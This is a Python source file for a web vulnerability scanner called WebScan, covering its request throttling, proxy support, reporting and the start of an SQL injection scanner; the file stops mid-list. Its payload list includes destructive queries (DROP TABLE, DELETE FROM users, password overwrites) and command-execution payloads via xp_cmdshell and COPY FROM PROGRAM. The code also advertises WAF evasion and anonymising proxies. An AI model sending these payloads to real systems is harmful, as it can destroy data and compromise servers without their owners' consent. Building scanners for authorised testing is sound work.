#!/usr/bin/env python3
"""
WebScan - Advanced Website Vulnerability Scanner (Standalone Version)

A comprehensive command-line tool for detecting various web vulnerabilities,
with multi-threaded scanning capabilities, detailed reporting, and aggressive
real-world vulnerability detection techniques.

Features:
- Multi-threaded scanning engine for efficient analysis
- Comprehensive vulnerability detection including SQL injection, XSS, SSL/TLS vulnerabilities,
  directory traversal, sensitive file disclosure, and more
- Advanced detection algorithms using real-world exploitation techniques
- Aggressive time-based SQL injection detection with database-specific payloads
- Context-aware XSS detection that analyzes DOM structure for true execution potential
- SSL/TLS vulnerability detection with cipher strength and protocol verification
- Detailed reporting with risk assessment and recommended mitigations
- Rate limiting to avoid triggering WAFs and IDS/IPS systems
- Support for scanning through proxies for anonymity
- Progress tracking with visual progress bars
- Extensive customization options
- Interactive mode for easier usage and real-time feedback

This is a single-file version of WebScan, with all module code combined.
Developed by AMKUSH
"""

import argparse
import concurrent.futures
import sys
import time
import os
import re
import socket
import ssl
import json
import logging
import urllib.parse
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime
from typing import List, Dict, Any, Tuple, Optional, Union
import random
import string
import threading
import signal
import ipaddress
from pathlib import Path

# Third-party imports
import requests
from bs4 import BeautifulSoup
from colorama import init, Fore, Style

# Try to import trafilatura for better content extraction
TRAFILATURA_AVAILABLE = False
try:
    import trafilatura
    TRAFILATURA_AVAILABLE = True
except ImportError:
    # Trafilatura is optional - can still function without it
    pass

# Try to import additional optional modules for enhanced functionality 
# These are not required but can improve scanning capabilities
DNS_AVAILABLE = False
try:
    import dns.resolver
    DNS_AVAILABLE = True
except ImportError:
    pass

SELENIUM_AVAILABLE = False
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.common.by import By
    SELENIUM_AVAILABLE = True
except ImportError:
    pass

# Initialize colorama for colored terminal output
init(autoreset=True)

# Global variables
VERSION = "1.2.0"
USER_AGENT = f"WebScan/{VERSION}"
SCAN_INTERRUPTED = False

# Args class for scan configuration
class ScanArgs:
    """Class to hold scan configuration parameters"""
    def __init__(self):
        # Required parameters with defaults
        self.url = ''                      # Target URL to scan
        self.scan_types = []               # List of scan types
        self.timeout = 10                  # Request timeout
        self.threads = 5                   # Number of threads
        self.depth = 2                     # Scan depth
        self.crawl = False                 # Crawl the site
        self.verbose = False               # Verbose output
        self.output = 'webscan_report.txt' # Output file
        
        # Optional parameters
        self.user_agent = USER_AGENT       # User-Agent string
        self.custom_headers = {'User-Agent': USER_AGENT}  # Custom HTTP headers
        self.show_progress = False         # Show progress indicator
        self.save_state = False            # Save scan state periodically
        self.risk_threshold = 1.0          # Risk threshold for reporting
        self.aggressive = False            # Aggressive scanning mode
        self.quiet = False                 # Quiet mode
        self.json = False                  # Output results as JSON
        self.target_list = ''              # File with list of targets
        self.resume = ''                   # Resume from state file
        
        # Enhanced features
        self.proxy = None                  # Proxy URL (e.g., http://127.0.0.1:8080)
        self.proxy_auth = None             # Proxy authentication (username:password)
        self.rate_limit = 0                # Requests per second (0 = no limit)
        self.random_delay = False          # Add random delay between requests
        self.delay_min = 0.5               # Minimum delay in seconds
        self.delay_max = 2.0               # Maximum delay in seconds
        self.rotate_user_agents = False    # Rotate through different user agents
        self.cookies = None                # Custom cookies for requests
DEFAULT_TIMEOUT = 10
SCAN_RESUME_DATA = {}
PROGRESS_LOCK = threading.Lock()
SCAN_INTERRUPTED = False

###########################################
# UTILITY FUNCTIONS
###########################################

def setup_logger(log_file='webscan.log', level=logging.INFO, no_color=False):
    """Set up the logger for the application."""
    logger = logging.getLogger('webscan')
    logger.setLevel(level)
    logger.handlers = []  # Clear existing handlers to avoid duplicates
    
    # Create console handler
    console_handler = logging.StreamHandler()
    console_handler.setLevel(level)
    
    # Create file handler
    file_handler = logging.FileHandler(log_file)
    file_handler.setLevel(level)
    
    # Create formatters
    if no_color:
        console_format = '[%(levelname)s] %(message)s'
    else:
        console_format = '%(colored_levelname)s %(message)s'
    file_format = '%(asctime)s - %(levelname)s - %(message)s'
    
    console_formatter = logging.Formatter(console_format)
    file_formatter = logging.Formatter(file_format)
    
    # Add formatters to handlers
    console_handler.setFormatter(console_formatter)
    file_handler.setFormatter(file_formatter)
    
    # Add handlers to logger
    logger.addHandler(console_handler)
    logger.addHandler(file_handler)
    
    # Custom formatter that adds colors
    def emit(self, record):
        record.colored_levelname = record.levelname
        if not no_color:
            if record.levelno == logging.INFO:
                record.colored_levelname = f"{Fore.BLUE}[INFO]{Style.RESET_ALL}"
            elif record.levelno == logging.WARNING:
                record.colored_levelname = f"{Fore.YELLOW}[WARNING]{Style.RESET_ALL}"
            elif record.levelno == logging.ERROR:
                record.colored_levelname = f"{Fore.RED}[ERROR]{Style.RESET_ALL}"
            elif record.levelno == logging.CRITICAL:
                record.colored_levelname = f"{Fore.RED}[CRITICAL]{Style.RESET_ALL}"
            elif record.levelno == logging.DEBUG:
                record.colored_levelname = f"{Fore.GREEN}[DEBUG]{Style.RESET_ALL}"
        
        logging.StreamHandler.emit(self, record)
    
    # Replace the emit method in the console handler
    console_handler.emit = lambda record: emit(console_handler, record)
    
    return logger

def is_url_accessible(url, timeout=10, user_agent=USER_AGENT, retry_count=2, logger=None):
    """
    Check if a URL is accessible with retry mechanism and better error handling.
    
    Args:
        url (str): URL to check
        timeout (int): Request timeout in seconds
        user_agent (str): User-Agent header value
        retry_count (int): Number of retries on failure
        logger: Optional logger instance
        
    Returns:
        bool: True if URL is accessible, False otherwise
    """
    headers = {
        'User-Agent': user_agent
    }
    
    # Try to parse URL first to validate format
    try:
        parsed_url = urlparse(url)
        if not parsed_url.netloc:
            if logger:
                logger.error(f"Invalid URL format: {url}")
            return False
    except Exception as e:
        if logger:
            logger.error(f"URL parsing error: {url} - {str(e)}")
        return False
        
    # Attempt connection with retry
    for attempt in range(retry_count + 1):
        try:
            # First try HEAD request (faster)
            response = requests.head(
                url, 
                headers=headers, 
                timeout=timeout,
                allow_redirects=True,
                verify=True  # Verify SSL certificates
            )
            
            # If HEAD request fails, try GET
            if response.status_code >= 400:
                response = requests.get(
                    url, 
                    headers=headers, 
                    timeout=timeout,
                    allow_redirects=True,
                    verify=True,  # Verify SSL certificates
                    stream=True   # Stream to avoid downloading entire content
                )
                # Close the connection to free resources
                response.close()
            
            return response.status_code < 400
            
        except requests.exceptions.SSLError as e:
            # Retry without SSL verification as a fallback
            if logger:
                logger.warning(f"SSL error for {url}, retrying without verification: {str(e)}")
            try:
                response = requests.get(
                    url, 
                    headers=headers, 
                    timeout=timeout,
                    allow_redirects=True,
                    verify=False,  # Skip SSL verification on retry
                    stream=True
                )
                response.close()
                return response.status_code < 400
            except Exception as inner_e:
                if logger:
                    logger.error(f"Error accessing {url} without SSL verification: {str(inner_e)}")
                
        except requests.exceptions.ConnectionError:
            # Connection refused or similar network errors
            if logger and attempt == retry_count:
                logger.error(f"Connection error for {url} after {retry_count} retries")
            
        except requests.exceptions.Timeout:
            # Request timed out
            if logger and attempt == retry_count:
                logger.error(f"Request timeout for {url} after {retry_count} retries")
            
        except Exception as e:
            # Other errors
            if logger and attempt == retry_count:
                logger.error(f"Error accessing {url}: {str(e)}")
        
        # Only sleep between retries, not after the last attempt
        if attempt < retry_count:
            time.sleep(1)  # Wait before retrying
    
    return False

# Progress indicator class for long-running scans
class ProgressIndicator:
    """Class for showing progress of long-running scans."""
    
    def __init__(self, total_items=100, prefix='Progress:', suffix='Complete', decimals=1, length=50, fill='█', print_end="\r"):
        """
        Initialize the progress indicator.
        
        Args:
            total_items (int): Total number of items to process
            prefix (str): Prefix string
            suffix (str): Suffix string
            decimals (int): Decimal places for percentage
            length (int): Bar length
            fill (str): Bar fill character
            print_end (str): End character (e.g. "\r", "\n")
        """
        self.total_items = total_items
        self.prefix = prefix
        self.suffix = suffix
        self.decimals = decimals
        self.length = length
        self.fill = fill
        self.print_end = print_end
        self.completed = 0
        self.active = True
        self.start_time = time.time()
        self.lock = threading.Lock()
    
    def update(self, completed=1):
        """
        Update progress indicator by incrementing completed items.
        
        Args:
            completed (int): Number of items completed
        """
        with self.lock:
            if not self.active:
                return
            
            self.completed += completed
            percent = (self.completed / self.total_items) * 100
            filled_length = int(self.length * self.completed // self.total_items)
            bar = self.fill * filled_length + '-' * (self.length - filled_length)
            
            elapsed_time = time.time() - self.start_time
            time_per_item = elapsed_time / self.completed if self.completed > 0 else 0
            eta = time_per_item * (self.total_items - self.completed) if self.completed > 0 else 0
            
            eta_min = int(eta // 60)
            eta_sec = int(eta % 60)
            
            # Format the progress bar
            print(f'\r{self.prefix} |{bar}| {percent:.{self.decimals}f}% {self.suffix} (ETA: {eta_min:02d}:{eta_sec:02d})', end=self.print_end)
            sys.stdout.flush()
            
            # Print new line when complete
            if self.completed >= self.total_items:
                print()
                self.active = False
    
    def finish(self):
        """Mark the progress as complete."""
        with self.lock:
            self.completed = self.total_items
            self.update(0)
            self.active = False


# Save and load scan state for resume functionality
def save_scan_state(state_file, data):
    """
    Save scan state to a file for resuming later.
    
    Args:
        state_file (str): File path to save state
        data (dict): Scan state data
    """
    try:
        with open(state_file, 'w') as f:
            json.dump(data, f, indent=2)
        return True
    except Exception as e:
        print(f"{Fore.RED}[ERROR] Failed to save scan state: {str(e)}")
        return False


def load_scan_state(state_file):
    """
    Load scan state from a file for resuming.
    
    Args:
        state_file (str): File path to load state from
        
    Returns:
        dict: Loaded scan state data or empty dict if file doesn't exist
    """
    if not os.path.exists(state_file):
        return {}
    
    try:
        with open(state_file, 'r') as f:
            return json.load(f)
    except Exception as e:
        print(f"{Fore.RED}[ERROR] Failed to load scan state: {str(e)}")
        return {}


def signal_handler(sig, frame):
    """Handle keyboard interrupt gracefully."""
    global SCAN_INTERRUPTED
    print(f"\n{Fore.YELLOW}[WARNING] Scan interrupted by user. Saving progress...")
    SCAN_INTERRUPTED = True
    # Let the main function handle the cleanup
    return


# Rate limiting and request throttling functionality
class RequestThrottler:
    """Class for throttling HTTP requests to avoid WAF detection and server overload."""
    
    def __init__(self, rate_limit=0, random_delay=False, delay_min=0.5, delay_max=2.0, logger=None):
        """
        Initialize the request throttler.
        
        Args:
            rate_limit (float): Maximum requests per second (0 = no limit)
            random_delay (bool): Whether to add random delays between requests
            delay_min (float): Minimum delay in seconds (if random_delay=True)
            delay_max (float): Maximum delay in seconds (if random_delay=True)
            logger: Optional logger instance
        """
        self.rate_limit = rate_limit
        self.random_delay = random_delay
        self.delay_min = delay_min
        self.delay_max = delay_max
        self.logger = logger
        self.last_request_time = 0
        self.lock = threading.Lock()
        
    def wait(self):
        """
        Wait the appropriate amount of time between requests based on settings.
        This ensures we don't exceed the rate limit and optionally adds randomization.
        """
        with self.lock:
            current_time = time.time()
            
            # Apply rate limiting if configured
            if self.rate_limit > 0:
                # Calculate minimum time between requests
                min_interval = 1.0 / self.rate_limit
                
                # Calculate time since last request
                elapsed = current_time - self.last_request_time
                
                # If we need to wait to respect the rate limit
                if elapsed < min_interval:
                    wait_time = min_interval - elapsed
                    if self.logger and wait_time > 0.1:  # Only log significant waits
                        self.logger.debug(f"Rate limiting: waiting {wait_time:.2f}s to maintain {self.rate_limit} req/sec")
                    time.sleep(wait_time)
            
            # Apply random delay if configured (useful for avoiding pattern detection)
            if self.random_delay:
                random_wait = random.uniform(self.delay_min, self.delay_max)
                if self.logger:
                    self.logger.debug(f"Adding random delay: {random_wait:.2f}s")
                time.sleep(random_wait)
            
            # Update the last request time
            self.last_request_time = time.time()


# Function to create requests session with proxy configuration
def create_request_session(proxy=None, proxy_auth=None, custom_headers=None, cookies=None, verify_ssl=True):
    """
    Create and configure a requests session with optional proxy and other settings.
    
    Args:
        proxy (str): Proxy URL (e.g., "http://127.0.0.1:8080")
        proxy_auth (str): Proxy authentication in format "username:password"
        custom_headers (dict): Custom HTTP headers to add to all requests
        cookies (dict or str): Cookies to add to the session
        verify_ssl (bool): Whether to verify SSL certificates
    
    Returns:
        requests.Session: Configured session object
    """
    session = requests.Session()
    
    # Configure proxy if provided
    if proxy:
        proxies = {
            "http": proxy,
            "https": proxy
        }
        session.proxies.update(proxies)
        
        # Add proxy authentication if provided
        if proxy_auth:
            try:
                username, password = proxy_auth.split(":")
                session.auth = (username, password)
            except ValueError:
                print(f"{Fore.YELLOW}[WARNING] Invalid proxy authentication format. Use 'username:password'")
    
    # Set custom headers
    if custom_headers:
        session.headers.update(custom_headers)
    
    # Add cookies if provided
    if cookies:
        if isinstance(cookies, str):
            # Parse cookie string
            try:
                cookie_dict = {}
                for item in cookies.split(';'):
                    if '=' in item:
                        key, value = item.strip().split('=', 1)
                        cookie_dict[key] = value
                session.cookies.update(cookie_dict)
            except Exception as e:
                print(f"{Fore.YELLOW}[WARNING] Error parsing cookie string: {str(e)}")
        elif isinstance(cookies, dict):
            session.cookies.update(cookies)
    
    # Set SSL verification
    session.verify = verify_ssl
    
    return session


def calculate_risk_score(vulnerability):
    """
    Calculate a numeric risk score based on vulnerability severity and other factors.
    
    Args:
        vulnerability (dict): Vulnerability data
        
    Returns:
        float: Risk score from 0-10
    """
    # Base score by severity
    severity_scores = {
        'Critical': 9.0, 
        'High': 7.0, 
        'Medium': 5.0, 
        'Low': 3.0, 
        'Info': 1.0
    }
    
    base_score = severity_scores.get(vulnerability.get('severity', 'Info'), 1.0)
    
    # Adjust score based on additional factors
    adjustment = 0.0
    
    # Type-specific adjustments
    vuln_type = vulnerability.get('type', '')
    
    if 'SQL Injection' in vuln_type:
        adjustment += 1.0  # SQL injection is high risk for data exposure
    elif 'Cross-Site Scripting' in vuln_type:
        adjustment += 0.8  # XSS can lead to client-side attacks
    elif 'Open Port' in vuln_type:
        # Higher risk for certain critical ports
        port = vulnerability.get('port', 0)
        if port in [21, 22, 23, 3389]:  # FTP, SSH, Telnet, RDP
            adjustment += 0.9
        else:
            adjustment += 0.4
    elif 'Directory Traversal' in vuln_type:
        adjustment += 0.9  # Can expose sensitive files
    elif 'Sensitive File' in vuln_type:
        adjustment += 0.7  # Direct exposure of sensitive data
    elif 'Missing Security Header' in vuln_type:
        # Different headers have different impact
        header = vulnerability.get('header', '')
        if header in ['Strict-Transport-Security', 'Content-Security-Policy']:
            adjustment += 0.6
        else:
            adjustment += 0.3
    elif 'SSL/TLS' in vuln_type or 'Weak Cipher' in vuln_type:
        adjustment += 0.7  # Encryption weaknesses are serious
    
    # Cap the final score at 10
    final_score = min(10.0, base_score + adjustment)
    
    return round(final_score, 1)


def expand_targets(targets, target_list_file=None):
    """
    Expand targets from single URL, list of URLs, IP range, or file.
    
    Args:
        targets (str): Target specification - URL, IP, IP range, or file path
        target_list_file (str): Optional file containing target URLs/IPs
        
    Returns:
        list: Expanded list of target URLs
    """
    expanded_targets = []
    
    # Read from file if specified
    if target_list_file:
        try:
            with open(target_list_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        expanded_targets.append(line)
            print(f"{Fore.CYAN}[INFO] Loaded {len(expanded_targets)} targets from {target_list_file}")
        except Exception as e:
            print(f"{Fore.RED}[ERROR] Failed to read target list file: {str(e)}")
    
    # Process direct target specification
    if targets:
        # Check if it's an IP range (CIDR notation)
        try:
            if '/' in targets and not targets.startswith(('http://', 'https://')):
                network = ipaddress.ip_network(targets, strict=False)
                for ip in network.hosts():
                    expanded_targets.append(f"http://{str(ip)}")
                print(f"{Fore.CYAN}[INFO] Expanded IP range to {len(expanded_targets)} targets")
            else:
                # Add single target
                expanded_targets.append(targets)
        except ValueError:
            # Not a valid CIDR, treat as single target
            expanded_targets.append(targets)
    
    # Validate and normalize URLs
    valid_targets = []
    for target in expanded_targets:
        # Add http:// if no scheme specified
        if not target.startswith(('http://', 'https://')):
            target = f"http://{target}"
        
        # Parse URL to validate
        try:
            parsed = urlparse(target)
            if parsed.netloc:
                valid_targets.append(target)
            else:
                print(f"{Fore.YELLOW}[WARNING] Invalid target URL skipped: {target}")
        except Exception:
            print(f"{Fore.YELLOW}[WARNING] Invalid target URL skipped: {target}")
    
    return valid_targets


def print_interactive_menu():
    """Display interactive mode menu."""
    print(f"\n{Fore.CYAN}====== WebScan Interactive Mode ======{Style.RESET_ALL}")
    print(f"1. {Fore.GREEN}Quick Scan{Style.RESET_ALL} (headers, info disclosure)")
    print(f"2. {Fore.YELLOW}Standard Scan{Style.RESET_ALL} (SQL injection, XSS, headers, info)")
    print(f"3. {Fore.RED}Full Scan{Style.RESET_ALL} (all checks)")
    print(f"4. {Fore.BLUE}Custom Scan{Style.RESET_ALL} (select checks)")
    print(f"5. {Fore.MAGENTA}Target Discovery{Style.RESET_ALL} (port scan, harvesting)")
    print(f"6. {Fore.CYAN}Resume Previous Scan{Style.RESET_ALL}")
    print(f"0. {Fore.WHITE}Exit{Style.RESET_ALL}")
    print(f"{Fore.CYAN}======================================{Style.RESET_ALL}")


class Reporter:
    """Class to generate vulnerability scan reports."""
    
    def __init__(self, output_file='webscan_report.txt'):
        """
        Initialize the reporter.
        
        Args:
            output_file (str): Path to the output report file
        """
        self.output_file = output_file
        self.vulnerabilities = []
        self.target_url = None
        self.scan_types = []
        # Initialize start_time with current datetime to avoid None references
        self.start_time = datetime.now()
        self.scan_id = self._generate_scan_id()
    
    def _generate_scan_id(self):
        """Generate a unique scan ID."""
        timestamp = int(time.time())
        random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        return f"scan_{timestamp}_{random_str}"
    
    def start_report(self, target_url, scan_types):
        """
        Start a new report.
        
        Args:
            target_url (str): The target URL being scanned
            scan_types (list): List of scan types being performed
        """
        self.target_url = target_url
        self.scan_types = scan_types
        # Reset the start time to the actual start of the scan
        self.start_time = datetime.now()
    
    def add_vulnerabilities(self, vulnerabilities):
        """
        Add vulnerabilities to the report.
        
        Args:
            vulnerabilities (list): List of vulnerability dictionaries
        """
        self.vulnerabilities.extend(vulnerabilities)
    
    def finalize_report(self, duration):
        """
        Generate the final report.
        
        Args:
            duration (float): Scan duration in seconds
            
        Returns:
            str: Path to the generated report file
        """
        # Count vulnerabilities by severity
        severity_counts = {
            'Critical': 0,
            'High': 0,
            'Medium': 0,
            'Low': 0,
            'Info': 0
        }
        
        for vuln in self.vulnerabilities:
            severity = vuln.get('severity', 'Info')
            severity_counts[severity] = severity_counts.get(severity, 0) + 1
        
        # Ensure start_time is valid before formatting
        start_time_str = 'N/A'
        if self.start_time:
            start_time_str = self.start_time.strftime('%Y-%m-%d %H:%M:%S')
        
        report_data = {
            'scan_info': {
                'target_url': self.target_url,
                'scan_types': self.scan_types,
                'start_time': start_time_str,
                'duration': f"{duration:.2f} seconds",
                'vulnerabilities_found': len(self.vulnerabilities)
            },
            'vulnerabilities': self.vulnerabilities
        }
        
        # Sort vulnerabilities by severity
        severity_order = {'Critical': 0, 'High': 1, 'Medium': 2, 'Low': 3, 'Info': 4}
        self.vulnerabilities.sort(key=lambda x: severity_order.get(x.get('severity', 'Info'), 5))
        
        # Generate the report based on file extension
        file_ext = os.path.splitext(self.output_file)[1].lower()
        
        if file_ext == '.json':
            self._write_json_report(report_data)
        else:
            self._write_text_report(report_data)
        
        return self.output_file
    
    def _write_json_report(self, report_data):
        """
        Write the report in JSON format.
        
        Args:
            report_data (dict): Report data
        """
        try:
            with open(self.output_file, 'w') as f:
                json.dump(report_data, f, indent=2)
        except Exception as e:
            print(f"Error writing JSON report: {str(e)}")
            # Fallback to text report
            self._write_text_report(report_data)
    
    def _write_text_report(self, report_data):
        """
        Write the report in text format.
        
        Args:
            report_data (dict): Report data
        """
        try:
            with open(self.output_file, 'w') as f:
                # Header with more detailed formatting
                f.write("=" * 80 + "\n")
                f.write(f"WebScan v{VERSION} - Advanced Vulnerability Report\n")
                f.write(f"Developed by AMKUSH\n")
                f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 80 + "\n\n")
                
                # Scan Information
                f.write("SCAN INFORMATION\n")
                f.write("-" * 80 + "\n")
                f.write(f"Target URL: {report_data['scan_info']['target_url']}\n")
                f.write(f"Scan Types: {', '.join(report_data['scan_info']['scan_types'])}\n")
                f.write(f"Start Time: {report_data['scan_info']['start_time']}\n")
                f.write(f"Duration: {report_data['scan_info']['duration']}\n")
                f.write(f"Vulnerabilities Found: {report_data['scan_info']['vulnerabilities_found']}\n\n")
                
                # Vulnerability Summary
                if report_data['vulnerabilities']:
                    severity_counts = {'Critical': 0, 'High': 0, 'Medium': 0, 'Low': 0, 'Info': 0}
                    
                    for vuln in report_data['vulnerabilities']:
                        severity = vuln.get('severity', 'Info')
                        severity_counts[severity] = severity_counts.get(severity, 0) + 1
                    
                    f.write("VULNERABILITY SUMMARY\n")
                    f.write("-" * 80 + "\n")
                    for severity, count in severity_counts.items():
                        if count > 0:
                            f.write(f"{severity}: {count}\n")
                    f.write("\n")
                
                # Detailed Vulnerabilities
                if report_data['vulnerabilities']:
                    f.write("DETAILED FINDINGS\n")
                    f.write("=" * 80 + "\n\n")
                    
                    # Group vulnerabilities by type
                    vuln_types = {}
                    for vuln in report_data['vulnerabilities']:
                        vuln_type = vuln.get('type', 'Unknown')
                        if vuln_type not in vuln_types:
                            vuln_types[vuln_type] = []
                        vuln_types[vuln_type].append(vuln)
                    
                    # Write each vulnerability type
                    for vuln_type, vulns in vuln_types.items():
                        f.write(f"{vuln_type}\n")
                        f.write("-" * len(vuln_type) + "\n")
                        
                        for i, vuln in enumerate(vulns):
                            if i > 0:
                                f.write("-" * 40 + "\n")
                            
                            f.write(f"Severity: {vuln.get('severity', 'Unknown')}\n")
                            
                            # URL
                            if 'url' in vuln:
                                f.write(f"URL: {vuln['url']}\n")
                            
                            # Details based on vulnerability type
                            if 'details' in vuln:
                                f.write(f"Details: {vuln['details']}\n")
                            
                            # Additional fields based on vulnerability type
                            if vuln_type == 'SQL Injection' or vuln_type == 'Cross-Site Scripting (XSS)':
                                if 'parameter' in vuln:
                                    f.write(f"Parameter: {vuln['parameter']}\n")
                                if 'payload' in vuln:
                                    f.write(f"Payload: {vuln['payload']}\n")
                            
                            elif vuln_type == 'Open Port':
                                if 'port' in vuln:
                                    f.write(f"Port: {vuln['port']}\n")
                                if 'service' in vuln:
                                    f.write(f"Service: {vuln['service']}\n")
                            
                            elif vuln_type == 'Directory Traversal':
                                if 'payload' in vuln:
                                    f.write(f"Payload: {vuln['payload']}\n")
                                if 'status_code' in vuln:
                                    f.write(f"Status Code: {vuln['status_code']}\n")
                            
                            elif vuln_type == 'Sensitive File Exposure':
                                if 'file_path' in vuln:
                                    f.write(f"File Path: {vuln['file_path']}\n")
                                if 'content_type' in vuln:
                                    f.write(f"Content Type: {vuln['content_type']}\n")
                                if 'content_length' in vuln:
                                    f.write(f"Content Length: {vuln['content_length']}\n")
                            
                            elif vuln_type == 'Missing Security Header' or vuln_type == 'Information Disclosure':
                                if 'header' in vuln:
                                    f.write(f"Header: {vuln['header']}\n")
                                if 'value' in vuln and 'header' in vuln:
                                    f.write(f"Value: {vuln['value']}\n")
                            
                            elif vuln_type == 'Insecure Protocol':
                                if 'protocol' in vuln:
                                    f.write(f"Protocol: {vuln['protocol']}\n")
                            
                            elif vuln_type == 'Weak Cipher':
                                if 'cipher' in vuln:
                                    f.write(f"Cipher: {vuln['cipher']}\n")
                            
                            # Recommendation if available
                            if 'recommendation' in vuln:
                                f.write(f"Recommendation: {vuln['recommendation']}\n")
                            
                            f.write("\n")
                        
                        f.write("\n")
                else:
                    f.write("No vulnerabilities were found.\n\n")
                
                # Footer
                f.write("=" * 80 + "\n")
                f.write(f"Report generated at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 80 + "\n")
        
        except Exception as e:
            print(f"Error writing text report: {str(e)}")

###########################################
# SCANNER MODULES 
###########################################

class SQLInjectionScanner:
    """Scanner for detecting SQL Injection vulnerabilities."""
    
    def __init__(self, target_url, timeout=10, depth=2, user_agent="WebScan/1.0.0", logger=None, verbose=False):
        """
        Initialize the SQL Injection scanner.
        
        Args:
            target_url (str): The target URL to scan
            timeout (int): Request timeout in seconds
            depth (int): Scan depth level
            user_agent (str): User-Agent string to use in requests
            logger: Logger instance
            verbose (bool): Enable verbose output
        """
        self.target_url = target_url
        self.timeout = timeout
        self.depth = depth
        self.headers = {'User-Agent': user_agent}
        self.logger = logger
        self.verbose = verbose
        
        # SQL injection payloads to test - expanded with more aggressive techniques
        self.payloads = [
            # Basic authentication bypass
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR 1=1 --",
            "1' OR '1'='1",
            "admin' --",
            "' OR 1=1#",
            "' OR 1=1/*",
            "') OR ('1'='1--",
            "')) OR (('1'='1--",
            
            # Error-based SQL injection
            "' AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x3a,(SELECT user()),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a) --",
            "' AND (SELECT 2*IF((SELECT * FROM (SELECT CONCAT(0x3a,(SELECT user()),0x3a,0x3a)) s), 1, 0))-- -",
            "AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)))",
            "AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x3a,user(),0x3a)) USING utf8)))",
            
            # Time-based blind SQL injection
            "' AND (SELECT * FROM (SELECT(SLEEP(1)))a) --",
            "' AND SLEEP(1) --",
            "' WAITFOR DELAY '0:0:3' --",
            "1' WAITFOR DELAY '0:0:3' --",
            "'; WAITFOR DELAY '0:0:3' --",
            "1); WAITFOR DELAY '0:0:3' --",
            "'; SELECT pg_sleep(3) --",
            "'; SELECT SLEEP(3) --",
            
            # Union-based SQL injection
            "' UNION SELECT null,null,null,null,null--",
            "' UNION SELECT 1,2,3,4,5--",
            "' UNION SELECT 1,2,3,4,@@version--",
            "' UNION SELECT username,password,3,4,5 FROM users--",
            "' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables--",
            "' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x3a,0x3a,(SELECT table_name FROM information_schema.tables LIMIT 1),0x3a,0x3a)--",
            
            # Stacked queries
            "'; DROP TABLE users--",
            "'; INSERT INTO users (username,password) VALUES ('hacker','password')--",
            "'; UPDATE users SET password='hacked' WHERE username='admin'--",
            "'; DELETE FROM users--",
            
            # Database specific payloads
            # MySQL
            "' OR 1=1 -- -",
            "' OR 1=1 ORDER BY 10-- -",
            "' PROCEDURE ANALYSE()-- -",
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version)))-- -",
            
            # SQL Server
            "' OR 1=1 -- ",
            "'; EXEC xp_cmdshell('net user')-- ",
            "'; EXEC master..xp_cmdshell 'net user'-- ",
            
            # PostgreSQL
            "' OR 1=1; -- ",
            "'; SELECT pg_sleep(5)-- ",
            "'; CREATE TEMP TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec; -- ",
            
            # Oracle
            "' OR 1=1 -- ",
            "' UNION SELECT banner FROM v$version-- ",
            "' UNION SELECT DISTINCT table_name FROM all_tables-- ",
            
            # SQLite
            "' OR 1=1 -- ",
            "' UNION SELECT sqlite_version()-- ",
            "' UNION SELECT group_concat(name) FROM sqlite_master WHERE type='table'-- "
        ]
        
        # Error patterns indicating successful SQL injection
        # Comprehensive SQL error patterns for aggressive real-world detection
        self.sql_error_patterns = [
            # MySQL errors - expanded for more variants
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"check the manual that corresponds to your (MySQL|MariaDB) server version",
            r"MySqlException",
            r"MySqlClient\.",
            r"com\.mysql\.jdbc",
            r"Unclosed quotation mark after the character string",
            r"Incorrect syntax near",
            r"SQL syntax error",
            r"mysql_fetch_array\(\)",
            r"getimagesize\(\)",
            r"mysqli_fetch_assoc\(\)",
            r"You have an error in your SQL syntax",
            
            # Oracle errors - expanded
            r"ORA-[0-9][0-9][0-9][0-9]",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*oci_.*",
            r"Oracle.*ORA-[0-9]",
            r"quoted string not properly terminated",
            r"SQL command not properly ended",
            
            # SQL Server errors - expanded
            r"Microsoft SQL Server",
            r"ODBC SQL Server Driver",
            r"SQLServer JDBC Driver",
            r"SQLServerException",
            r"Warning.*mssql_.*",
            r"SQL Server.*error",
            r"Unclosed quotation mark after the character string",
            r"Incorrect syntax near",
            r"Line [0-9]*: Incorrect syntax near",
            r"Syntax error converting the varchar value",
            r"Conversion failed when converting",
            r"SqlException",
            r"SqlClient\.",
            r"System\.Data\.SqlClient",
            
            # SQLite errors - expanded
            r"SQLITE_ERROR",
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"System\.Data\.SQLite\.SQLiteException",
            r"Warning.*sqlite_.*",
            r"\[SQLITE_ERROR\]",
            r"SQLite3::query",
            r"near \".*\": syntax error",
            
            # PostgreSQL errors - expanded
            r"PostgreSQL.*ERROR",
            r"Warning.*pg_.*",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"PG::SyntaxError",
            r"org\.postgresql\.util\.PSQLException",
            r"Supplied argument is not a valid PostgreSQL result",
            r"ERROR: syntax error at or near",
            r"ERROR: unterminated quoted string at or near",
            r"PSQLException",
            
            # DB2 and other errors
            r"DB2 SQL error",
            r"JDBC.*DB2",
            r"CLI Driver.*DB2",
            r"SQLSTATE\[\d+\]",
            r"Warning.*sybase.*",
            r"DriverSapDB",
            r"Sybase message",
            r"\[IBM\]\[CLI Driver\]\[DB2/",
            
            # Generic SQL error patterns
            r"SQL error.*PLS-[0-9][0-9][0-9][0-9]",
            r"Warning.*SQL",
            r"Error.*SQL",
            r"SQL Error",
            r"SQLState",
            r"SQL statement",
            r"JDBC.*SQL",
